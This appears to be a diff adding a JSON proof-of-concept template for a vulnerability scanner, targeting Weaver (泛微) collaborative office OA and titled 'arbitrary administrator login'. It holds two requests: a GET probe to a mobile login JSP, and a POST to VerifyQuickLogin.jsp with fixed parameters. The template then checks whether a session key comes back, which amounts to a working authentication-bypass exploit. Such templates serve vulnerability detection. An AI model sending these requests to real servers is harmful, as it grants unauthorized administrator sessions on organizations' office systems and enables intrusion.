@@ -1,0 +1,56 @@
+{
+    "Name": "泛微-协同办公OA任意管理员登录",
+    "Description": "泛微-协同办公OA任意管理员登录",
+    "Product": "泛微",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/mobile/plugin/plus/login/LoingFromEb.jsp",
+        "Port":"",
+        "Data":"",
+        "follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+            "Check_Steps":"AND",
+            "Checks": [
+                    {
+                    "Operation": "contains", 
+                    "Key":"",
+                    "Value": "window.location.href=\"/login/login.jsp"
+                    },
+                     {
+                    "Operation": "code", 
+                    "Key":"",
+                    "Value": "200"  
+                     }
+            ]
+            },
+            "Next_decide":"AND"
+        },{
+            "Method": "POST",
+            "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36","Content-Type":"application/x-www-form-urlencoded"},
+            "Uri":"/mobile/plugin/VerifyQuickLogin.jsp",
+            "Port":"",
+            "Data":"identifier=1&language=1&ipaddress=1.1",
+            "follow_redirects":"false",
+            "Upload":{"Name": "","fileName": "","filePath": "" },
+            "Response":{
+                "Check_Steps":"AND",
+                "Checks": [
+                        {
+                        "Operation": "contains", 
+                        "Key":"",
+                        "Value": "{\"message\":\"1\",\"sessionkey\":"
+                        },
+                         {
+                        "Operation": "code", 
+                        "Key":"",
+                        "Value": "200"  
+                         }
+                ]
+                },
+                "Next_decide":""
+            }
+    ]}
